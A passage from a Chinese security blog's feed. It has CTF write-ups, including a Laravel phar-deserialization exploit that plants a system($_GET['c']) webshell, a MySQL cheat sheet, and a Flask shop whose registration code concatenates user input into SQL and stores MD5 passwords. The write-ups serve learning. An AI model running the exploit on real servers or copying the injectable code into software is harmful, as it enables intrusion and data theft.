private.pem</span><br><span class="line">flag&#123;Rs4_1s_3asY&#125;</span><br></pre></td></tr></table></figure><h2 id="欢迎来到科来杯"><a href="#欢迎来到科来杯" class="headerlink" title="欢迎来到科来杯"></a>欢迎来到科来杯</h2><p>winhex打开文件，发现文件已损坏，文件头也不是png正常的文件头，于是拿正常的文件头和该文件头做异或，发现结果是<code>kelaibei</code>,后面的<code>000000^6B656C=kel</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="number">0XE235222664687F636B656C</span></span><br><span class="line">a = <span class="number">0X89504E470D0A1A0A000000</span></span><br><span class="line"><span class="keyword">print</span> hex(s^a)</span><br><span class="line"><span class="comment">#7738710700341749097</span></span><br><span class="line"><span class="comment"># kelaibeikel</span></span><br></pre></td></tr></table></figure><p>假设原来的正常文件是<code>A</code>，现在的加密的文件为<code>B</code>，<code>key</code>是<code>kelaibei</code>，则<code>A^key=B</code> ,那么解密就很容易了：</p><p><code>B^key=A</code></p><p>解密脚本如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line">s = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">key = <span class="string">&#x27;kelaibei&#x27;</span></span><br><span class="line">l = <span class="number">7</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;./encode.png&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="keyword">if</span> i &gt;= len(key):</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">a=f.read(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> a:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">ch = hex(ord(key[i])^ord(a))[<span class="number">2</span>:]</span><br><span class="line"><span class="keyword">if</span> len(ch) == <span class="number">1</span>:</span><br><span class="line">ch = <span class="string">&#x27;0&#x27;</span>+ch</span><br><span class="line">s += ch</span><br><span class="line">s += <span class="string">&#x27; &#x27;</span></span><br><span class="line">i+=<span class="number">1</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;b.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> w:</span><br><span class="line">w.write(s)</span><br><span class="line">print(<span class="string">&#x27;done.&#x27;</span>)</span><br></pre></td></tr></table></figure><p>将生成的hex数据复制到winhex中,得到<code>decode.png</code>文件</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180918/Iecjk39FBd.png?imageslim" alt="mark"></p><p>然后发现蓝色通道的最低位有一个二维码：</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180918/9FfjaadcHi.png?imageslim" alt="mark"></p><p>扫码得到flag: <code>flag&#123;x0r_pNg_l5b&#125;</code></p><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="php与js"><a href="#php与js" class="headerlink" title="php与js"></a>php与js</h2><p>1.XFF<br>2.UA<br>3.php弱类型md5<br>4.利用md5不能处理数组的特点绕过，数组绕过(md5(arr)==null)<br>5.md5爆破，附上脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getmd5</span>(<span class="params">code</span>):</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">999999</span>):</span><br><span class="line">temp = hashlib.md5(str(i)).hexdigest()</span><br><span class="line"><span class="keyword">if</span> temp[<span class="number">0</span>:<span class="number">6</span>] == code:</span><br><span class="line"><span class="keyword">return</span> i</span><br><span class="line"><span class="keyword">print</span> getmd5(<span class="string">&#x27;084a12&#x27;</span>)</span><br></pre></td></tr></table></figure><p>6.js,看源码就知道了密码了。</p><h2 id="share——WEB2"><a href="#share——WEB2" class="headerlink" title="share——WEB2"></a>share——WEB2</h2><p>这个题暴露我代码审计方面的很大的问题==、</p><p>以下为粘贴的官方WP</p><hr><p>解题过程</p><p>进行踩点会发现存在 robots.txt 文件，访问得到source_code.zip源码包，进行代码审计。</p><p>源码包中含有 readme.md 文件，浏览后可以得到的有用信息有：web程序的路径，以及storage的www-data权限。</p><p>分析代码，在 app/Http/Controllers/ShareController.php 中，存在上传功能与远程获取功能，这里远程获取没有做严格过滤，所以可以使用phar协议读取内网文件以此触发反序列化。</p><p>这里需要找gadgets构造pop链，</p><p>在 vendor/guzzlehttp/guzzle/src/Cookie/FileCookieJar.php 中，存在一个可利用组件。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line"></span><br><span class="line">     <span class="keyword">$this</span>-&gt;save(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是这里会发现访问入口 public 文件夹是没权限写文件的，只有无法直接访问的storage文件夹存在写权限。</p><p>视图文件存在这里，但是不知道文件名，这里是laravel中的一个特性。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getCompiledPath</span>(<span class="params">$path</span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;cachePath.<span class="string">&#x27;/&#x27;</span>.sha1($path).<span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译后的视图文件都是 sha1(path + blade filename), 而web路径在readme中已经给出，所以可以自己算出编译后的视图文件名。</p><p>直接使用给出的源码包的组件，使用phar压一个包，伪造成gif图片。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">         <span class="keyword">require</span> <span class="string">&#x27;/usr/share/nginx/html/vendor/autoload.php&#x27;</span>;    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">         <span class="keyword">use</span> <span class="title">GuzzleHttp</span>\<span class="title">Cookie</span>\<span class="title">FileCookieJar</span>;   </span><br><span class="line">    </span><br><span class="line">         <span class="keyword">use</span> <span class="title">GuzzleHttp</span>\<span class="title">Cookie</span>\<span class="title">SetCookie</span>;</span><br><span class="line">    </span><br><span class="line">                $obj = newFileCookieJar(<span class="string">&#x27;/usr/share/nginx/html/storage/framework/views/f7223189603002557f9e3db9d46a59399839e193.php&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">                $payload = <span class="string">&quot;&lt;?php echo system(\$_GET[&#x27;c&#x27;])?&gt;&quot;</span>;</span><br><span class="line">                $obj-&gt;setCookie(<span class="keyword">new</span> SetCookie([          </span><br><span class="line">    </span><br><span class="line">                        <span class="string">&#x27;Name&#x27;</span> =&gt; <span class="string">&#x27;foo&#x27;</span>,           </span><br><span class="line">    </span><br><span class="line">                        <span class="string">&#x27;Value&#x27;</span> =&gt; <span class="string">&#x27;test&#x27;</span>,         </span><br><span class="line">    </span><br><span class="line">                        <span class="string">&#x27;Domain&#x27;</span> =&gt; $payload,     </span><br><span class="line">    </span><br><span class="line">                       <span class="string">&#x27;Expires&#x27;</span> =&gt; time()</span><br><span class="line">                 ]));</span><br><span class="line">                 $p = <span class="keyword">new</span> Phar(<span class="string">&#x27;./1.phar&#x27;</span>, <span class="number">0</span>);</span><br><span class="line">                 $p-&gt;startBuffering();</span><br><span class="line">                 $p-&gt;setStub(<span class="string">&#x27;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);</span><br><span class="line">                 $p-&gt;setMetadata($obj);</span><br><span class="line">                 $p-&gt;addFromString(<span class="string">&#x27;1.txt&#x27;</span>,<span class="string">&#x27;text&#x27;</span>);</span><br><span class="line">                 $p-&gt;stopBuffering();</span><br><span class="line">                 rename(<span class="string">&#x27;./1.phar&#x27;</span>, <span class="string">&#x27;1.gif&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>f7223189603002557f9e3db9d46a59399839e193.php 是故事内容的视图文件。</p><p>先使用上传功能将gif文件上传，然后在浏览故事可以看到上传后的文件名。</p><p>然后分享新故事使用远程获取功能使用 phar:///usr/share/nginx/html/storage/app/public/xxx.gif 进行反序列化操作。</p><p>然后访问故事详情，获取webshell。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL语句备忘录</title>
      <link href="/2018/09/04/SQL%E8%AF%AD%E5%8F%A5%E5%A4%87%E5%BF%98%E5%BD%95/"/>
      <url>/2018/09/04/SQL%E8%AF%AD%E5%8F%A5%E5%A4%87%E5%BF%98%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h1 id="SQL语句备忘录"><a href="#SQL语句备忘录" class="headerlink" title="SQL语句备忘录"></a>SQL语句备忘录</h1><h2 id="1-创建授权用户"><a href="#1-创建授权用户" class="headerlink" title="1. 创建授权用户"></a>1. 创建授权用户</h2><h3 id="1-1-创建用户"><a href="#1-1-创建用户" class="headerlink" title="1.1 创建用户"></a>1.1 创建用户</h3><ul><li><p>命令 : <code>CREATE USER &#39;username&#39;@&#39;host&#39; IDENTIFIED BY &#39;password&#39;;</code><br>说明:username - 你将创建的用户名, host - 指定该用户在哪个主机上可以登陆,如果是本地用户可用localhost, 如果想让该用户可以从任意远程主机登陆,可以使用通配符%. password - 该用户的登陆密码,密码可以为空,如果为空则该用户可以不需要密码登陆服务器. </p></li><li><p>例子: </p></li></ul><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">USER</span> <span class="string">&#x27;dog&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> <span class="keyword">IDENTIFIED</span> <span class="keyword">BY</span> <span class="string">&#x27;123456&#x27;</span>; </span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">USER</span> <span class="string">&#x27;pig&#x27;</span>@<span class="string">&#x27;192.168.1.101_&#x27;</span> IDENDIFIED <span class="keyword">BY</span> <span class="string">&#x27;123456&#x27;</span>; </span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">USER</span> <span class="string">&#x27;pig&#x27;</span>@<span class="string">&#x27;%&#x27;</span> <span class="keyword">IDENTIFIED</span> <span class="keyword">BY</span> <span class="string">&#x27;123456&#x27;</span>; </span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">USER</span> <span class="string">&#x27;pig&#x27;</span>@<span class="string">&#x27;%&#x27;</span> <span class="keyword">IDENTIFIED</span> <span class="keyword">BY</span> <span class="string">&#x27;&#x27;</span>; </span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">USER</span> <span class="string">&#x27;pig&#x27;</span>@<span class="string">&#x27;%&#x27;</span>; </span><br></pre></td></tr></table></figure><h3 id="1-2-授权"><a href="#1-2-授权" class="headerlink" title="1.2 授权"></a>1.2 授权</h3><ul><li><p>命令 : <code>GRANT privileges ON databasename.tablename TO &#39;username&#39;@&#39;host&#39;</code> </p></li><li><p>说明:  privileges - 用户的操作权限,如SELECT , INSERT , UPDATE  等.如果要授予所的权限则使用ALL.;databasename -  数据库名,tablename-表名,如果要授予该用户对所有数据库和表的相应操作权限则可用<code>*</code>表示, 如<code>*.*</code></p><p>例子: </p></li></ul><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GRANT</span> <span class="keyword">SELECT</span>, <span class="keyword">INSERT</span> <span class="keyword">ON</span> test.user <span class="keyword">TO</span> <span class="string">&#x27;pig&#x27;</span>@<span class="string">&#x27;%&#x27;</span>; </span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">ALL</span> <span class="keyword">ON</span> *.* <span class="keyword">TO</span> <span class="string">&#x27;pig&#x27;</span>@<span class="string">&#x27;%&#x27;</span>; </span><br></pre></td></tr></table></figure><p>  <strong>注意 : 用以上命令授权的用户不能给其它用户授权,如果想让该用户可以授权,用以下命令:</strong> </p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GRANT</span> <span class="keyword">privileges</span> <span class="keyword">ON</span> databasename.tablename <span class="keyword">TO</span> <span class="string">&#x27;username&#x27;</span>@<span class="string">&#x27;host&#x27;</span> <span class="keyword">WITH</span> <span class="keyword">GRANT</span> <span class="keyword">OPTION</span>; </span><br></pre></td></tr></table></figure><h3 id="1-3-设置与更改用户密码"><a href="#1-3-设置与更改用户密码" class="headerlink" title="1.3 设置与更改用户密码"></a>1.3 设置与更改用户密码</h3><ul><li><p>命令 : <code>SET PASSWORD FOR &#39;username&#39;@&#39;host&#39; = PASSWORD(&#39;newpassword&#39;);</code></p></li><li><p>如果是当前登陆用户用<code>SET PASSWORD = PASSWORD(&quot;newpassword&quot;);</code> </p></li><li><p>例子:</p></li></ul><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SET</span> <span class="keyword">PASSWORD</span> <span class="keyword">FOR</span> <span class="string">&#x27;pig&#x27;</span>@<span class="string">&#x27;%&#x27;</span> = <span class="keyword">PASSWORD</span>(<span class="string">&quot;123456&quot;</span>); </span><br></pre></td></tr></table></figure><h3 id="1-4-撤销用户权限"><a href="#1-4-撤销用户权限" class="headerlink" title="1.4 撤销用户权限"></a>1.4 撤销用户权限</h3><ul><li><p>命令 : <code> REVOKE privilege ON databasename.tablename FROM &#39;username&#39;@&#39;host&#39;;</code> </p></li><li><p>说明: privilege, databasename, tablename - 同授权部分. </p></li><li><p>例子: </p></li></ul><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">REVOKE</span> <span class="keyword">SELECT</span> <span class="keyword">ON</span> *.* <span class="keyword">FROM</span> <span class="string">&#x27;pig&#x27;</span>@<span class="string">&#x27;%&#x27;</span>; </span><br></pre></td></tr></table></figure><p><strong>注意:</strong>  假如你在给用户<code>&#39;pig&#39;@&#39;%&#39;</code>授权的时候是这样的(或类似的):<code>GRANT SELECT ON test.user TO &#39;pig&#39;@&#39;%&#39;</code>,  则在使用<code>REVOKE SELECT ON *.* FROM &#39;pig&#39;@&#39;%&#39;;</code>命令并不能撤销该用户对test数据库中user表的SELECT  操作.</p><p>相反,如果授权使用的是<code>GRANT SELECT ON *.*  TO &#39;pig&#39;@&#39;%&#39;;</code>则<code>REVOKE SELECT ON test.user FROM  &#39;pig&#39;@&#39;%&#39;;</code>命令也不能撤销该用户对test数据库中user表的Select 权限. </p><p>具体信息可以用命令<code>SHOW GRANTS FOR &#39;pig&#39;@&#39;%&#39;;</code> 查看. </p><h3 id="1-5-删除用户"><a href="#1-5-删除用户" class="headerlink" title="1.5 删除用户"></a>1.5 删除用户</h3><ul><li><p>命令: <code>DROP USER &#39;username&#39;@&#39;host&#39;;</code> </p></li><li><p>例子:</p></li></ul><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">USER</span> pig</span><br></pre></td></tr></table></figure><h2 id="2-增删修改数据库"><a href="#2-增删修改数据库" class="headerlink" title="2. 增删修改数据库"></a>2. 增删修改数据库</h2><h3 id="2-1-显示所有数据库"><a href="#2-1-显示所有数据库" class="headerlink" title="2.1 显示所有数据库"></a>2.1 显示所有数据库</h3><ul><li><p>命令： <code>Show Databases；</code></p></li><li><p>查看表结构</p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">mysql&gt; desc test;</span><br></pre></td></tr></table></figure><h3 id="2-2-使用某个库"><a href="#2-2-使用某个库" class="headerlink" title="2.2 使用某个库"></a>2.2 使用某个库</h3></li><li><p><code>USE dbname;</code></p></li></ul><h3 id="2-3-创建数据库"><a href="#2-3-创建数据库" class="headerlink" title="2.3 创建数据库"></a>2.3 创建数据库</h3><p><code>CREATE DATABASE dbname;</code></p><h3 id="2-4-删除数据库"><a href="#2-4-删除数据库" class="headerlink" title="2.4 删除数据库"></a>2.4 删除数据库</h3><p><code>DROP DATABASE dbname;</code></p><h2 id="3-数据表增删改"><a href="#3-数据表增删改" class="headerlink" title="3 数据表增删改"></a>3 数据表增删改</h2><h3 id="3-1-创建数据表"><a href="#3-1-创建数据表" class="headerlink" title="3.1 创建数据表"></a>3.1 创建数据表</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> &lt;表名&gt;(&lt;列名&gt; &lt;数据类型&gt;[列级完整性约束]  [,&lt;列名&gt; &lt;数据类型&gt;[列级完整性约束]]…);</span><br><span class="line"></span><br><span class="line"><span class="keyword">Create</span> <span class="keyword">TABLE</span> tbname(col1 <span class="built_in">int</span> <span class="keyword">not</span> <span class="literal">null</span>, col2 <span class="built_in">varchar</span>(<span class="number">20</span>));</span><br></pre></td></tr></table></figure><h3 id="3-2-删除数据表"><a href="#3-2-删除数据表" class="headerlink" title="3.2 删除数据表"></a>3.2 删除数据表</h3><p><code>DROPTABLE tbname;</code></p><h3 id="3-3-修改数据表内容"><a href="#3-3-修改数据表内容" class="headerlink" title="3.3 修改数据表内容"></a>3.3 修改数据表内容</h3><p><strong>设置主键</strong></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> <span class="string">`table_name`</span> <span class="keyword">ADD</span> PRIMARY <span class="keyword">KEY</span>(<span class="string">`field_name`</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> <span class="string">`table`</span> <span class="keyword">CHANGE</span> <span class="string">`field`</span> <span class="string">`field_new_name`</span> <span class="built_in">INT</span>(<span class="number">4</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">&#x27;0&#x27;</span> <span class="keyword">FIRST</span>;</span><br><span class="line"><span class="comment">-- 然后这里有个坑， id 必须反引号，不然报错。</span></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> fuck <span class="keyword">change</span> <span class="keyword">id</span> <span class="string">`id`</span> <span class="built_in">int</span>(<span class="number">4</span>) <span class="keyword">not</span> <span class="literal">null</span> defualt <span class="string">&#x27;0&#x27;</span> frist; </span><br></pre></td></tr></table></figure><p>添加列</p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">mysql&gt; alter table test add(tage int(3));</span><br></pre></td></tr></table></figure><p>删除列：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> testtable  <span class="keyword">drop</span>  <span class="keyword">column</span> <span class="keyword">name</span>;</span><br></pre></td></tr></table></figure><p>修改列的类型：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> testtable <span class="keyword">modify</span> address <span class="built_in">char</span>(<span class="number">40</span>)</span><br><span class="line"></span><br><span class="line">或者这样：</span><br><span class="line"></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> testtable <span class="keyword">change</span> address address  <span class="built_in">char</span>(<span class="number">40</span>)</span><br></pre></td></tr></table></figure><p>修改表列名</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> testtable <span class="keyword">change</span>  <span class="keyword">column</span> address address1 <span class="built_in">varchar</span>(<span class="number">30</span>)</span><br></pre></td></tr></table></figure><h3 id="3-4-向表中插入数据"><a href="#3-4-向表中插入数据" class="headerlink" title="3.4 向表中插入数据"></a>3.4 向表中插入数据</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 插入顺序要与实际存储顺序严格一致</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> 表名称 <span class="keyword">VALUES</span> (值<span class="number">1</span>, 值<span class="number">2</span>,....)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 插入顺序不需要与实际存储顺序严格一致，但是要与前面的列名顺序一致。</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> table_name (列<span class="number">1</span>, 列<span class="number">2</span>,...) <span class="keyword">VALUES</span> (值<span class="number">1</span>, 值<span class="number">2</span>,....)</span><br></pre></td></tr></table></figure><h3 id="3-5-更新数据表的内容"><a href="#3-5-更新数据表的内容" class="headerlink" title="3.5 更新数据表的内容"></a>3.5 更新数据表的内容</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> 表名称 <span class="keyword">SET</span> 列名称 = 新值 <span class="keyword">WHERE</span> 列名称 = 某值</span><br></pre></td></tr></table></figure><h3 id="3-6-删除某条数据"><a href="#3-6-删除某条数据" class="headerlink" title="3.6 删除某条数据"></a>3.6 删除某条数据</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> 表名称 <span class="keyword">WHERE</span> 列名称 = 值</span><br></pre></td></tr></table></figure><h2 id="4-数据查询"><a href="#4-数据查询" class="headerlink" title="4 数据查询"></a>4 数据查询</h2><h3 id="4-1-最简单的查询"><a href="#4-1-最简单的查询" class="headerlink" title="4.1 最简单的查询"></a>4.1 最简单的查询</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 列名 <span class="keyword">FROM</span> [dbname.]tbname <span class="keyword">WHERE</span> 条件</span><br><span class="line">mysql&gt; <span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username=<span class="string">&#x27;v0w&#x27;</span>;</span><br></pre></td></tr></table></figure><h3 id="4-2-union-查询"><a href="#4-2-union-查询" class="headerlink" title="4.2 union 查询"></a>4.2 union 查询</h3><p>UNION 操作符用于合并两个或多个 SELECT 语句的结果集。</p><p>请注意，UNION 内部的 SELECT 语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每条 SELECT 语句中的列的顺序必须相同。</p><p> <strong>SQL UNION 语法</strong></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s) <span class="keyword">FROM</span> table_name1</span><br><span class="line"><span class="keyword">UNION</span></span><br><span class="line"><span class="keyword">SELECT</span> column_name(s) <span class="keyword">FROM</span> table_name2</span><br></pre></td></tr></table></figure><h3 id="4-3-join查询"><a href="#4-3-join查询" class="headerlink" title="4.3 join查询"></a>4.3 join查询</h3><p>有时为了得到完整的结果，我们需要从两个或更多的表中获取结果。我们就需要执行 join。</p><p>数据库中的表可通过键将彼此联系起来。主键（Primary Key）是一个列，在这个列中的每一行的值都是唯一的。在表中，每个主键的值都是唯一的。这样做的目的是在不重复每个表中的所有数据的情况下，把表间的数据交叉捆绑在一起。</p><p><strong>引用两个表</strong></p><p>我们可以通过引用两个表的方式，从两个表中获取数据：</p><p>谁订购了产品，并且他们订购了什么产品？</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Persons.LastName, Persons.FirstName, Orders.OrderNo</span><br><span class="line"><span class="keyword">FROM</span> Persons, Orders</span><br><span class="line"><span class="keyword">WHERE</span> Persons.Id_P = Orders.Id_P </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>V0WShop项目文档</title>
      <link href="/2018/08/31/V0WShop/"/>
      <url>/2018/08/31/V0WShop/</url>
      
        <content type="html"><![CDATA[<h1 id="V0WShop项目文档"><a href="#V0WShop项目文档" class="headerlink" title="V0WShop项目文档"></a>V0WShop项目文档</h1><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一个基于<code>falsk+jinja2+mysql(pymysql操作)</code>的简单的电商系统。界面比较简陋，学习flask，做的一个简单的项目，大佬轻喷。<br>但是这次的项目由于从开始学习到完成只用了四天，时间实在比较短，还有很多东西没有掌握，项目还有很多不足之处，在文章的后面，我也会总结一下，以便后期完善。</p><h1 id="结构搭建"><a href="#结构搭建" class="headerlink" title="结构搭建"></a>结构搭建</h1><h2 id="前端"><a href="#前端" class="headerlink" title="前端"></a>前端</h2><ul><li>导航栏 base.html<ul><li>登录(登录以后变成退出账户)</li><li>注册</li><li>首页</li><li>我的 (user.html)（用于记录历史以及余额等等）</li></ul></li><li>登陆 login.html</li><li>注册 register.html</li><li>首页 index.html（由于各种因素，并由于往数据库放更多的商品。就首页这么多商品）</li><li>用户页面 user.html</li><li>商品详情 detail.html（进入商品详情页面，了解更多，并且可以在此页面完成购买）</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">采用jinja继承模板的方式，页面都继承于导航base.html</span><br></pre></td></tr></table></figure><h2 id="后端"><a href="#后端" class="headerlink" title="后端"></a>后端</h2><ul><li>config.py<ul><li>数据库配置</li><li>SECRET_KEY</li></ul></li><li>models.py 类模型<ul><li>User</li><li>Goods</li></ul></li><li>FlaskShop.py<ul><li>/</li><li>/login</li><li>/register</li><li>/user/<user_id></li><li>/index</li><li>/detail/<gid></li><li>logout</li></ul></li></ul><h2 id="数据库："><a href="#数据库：" class="headerlink" title="数据库："></a>数据库：</h2><ul><li>user表:<ul><li>telphone varcahr(11)主键</li><li>username varchar(20)</li><li>password varchar(32)<br>   money    float</li></ul></li><li>goods表：<ul><li>gid int 主键</li><li>gname varchar(30)</li><li>pic varcahr(10)</li><li>introduction varchar(100)</li><li>price double</li><li>gname varchar(20)</li></ul></li><li>history表：<ul><li>telphone varcahr(11) </li><li>gid int </li><li>datetime</li></ul></li></ul><h1 id="项目代码"><a href="#项目代码" class="headerlink" title="项目代码"></a>项目代码</h1><h3 id="注册"><a href="#注册" class="headerlink" title="注册"></a>注册</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(&#x27;/register/&#x27;,methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span>():</span></span><br><span class="line">    error = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>,error=error)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        telephone = request.form.get(<span class="string">&#x27;telephone&#x27;</span>)</span><br><span class="line">        username = request.form.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">        password1 = request.form.get(<span class="string">&#x27;password1&#x27;</span>)</span><br><span class="line">        password2 = request.form.get(<span class="string">&#x27;password2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#验证：手机号是否重复，密码是否不一致</span></span><br><span class="line">        <span class="keyword">if</span> telephone==<span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> username==<span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> password1==<span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> password2==<span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            error = <span class="string">u&#x27;请将信息填写完整&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>,error=error)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            sql_exist = <span class="string">&quot;select * from users where telephone=&#x27;&quot;</span>+telephone+<span class="string">&quot;&#x27;&quot;</span></span><br><span class="line">            <span class="comment"># print sql_exist</span></span><br><span class="line">            <span class="keyword">if</span> cursor.execute(sql_exist):</span><br><span class="line">                error = <span class="string">u&#x27;手机号码已经注册了&#x27;</span></span><br><span class="line">                <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>,error=error)</span><br><span class="line">            <span class="keyword">else</span>:<span class="comment">#验证两个密码是否一致</span></span><br><span class="line">                <span class="keyword">if</span> password1 != password2:</span><br><span class="line">                    error = <span class="string">u&#x27;密码不一致&#x27;</span></span><br><span class="line">                    <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>,error=error)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    save_pass = hashlib.md5(password1).hexdigest()</span><br><span class="line">                    register_sql = <span class="string">&quot;INSERT INTO users(telephone,username,password,money) VALUES (&#x27;&quot;</span> + telephone+ <span class="string">&quot;&#x27;,&#x27;&quot;</span>+username+ <span class="string">&quot;&#x27;,&#x27;&quot;</span>+save_pass+<span class="string">&quot;&#x27;, 0);&quot;</span></span><br><span class="line">                    <span class="comment"># print register_sql</span></span><br><span class="line">                    r = cursor.execute(register_sql)</span><br><span class="line">                    db.commit()</span><br><span class="line">                    <span class="keyword">if</span> r:</span><br><span class="line">                        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        error = <span class="string">u&#x27;未知错误&#x27;</span></span><br><span class="line">                        <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>,error=error)</span><br></pre></td></tr></table></figure><h3 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(&#x27;/login/&#x27;,methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>():</span></span><br><span class="line">    error = <span class="literal">None</span></span><br><span class="line">    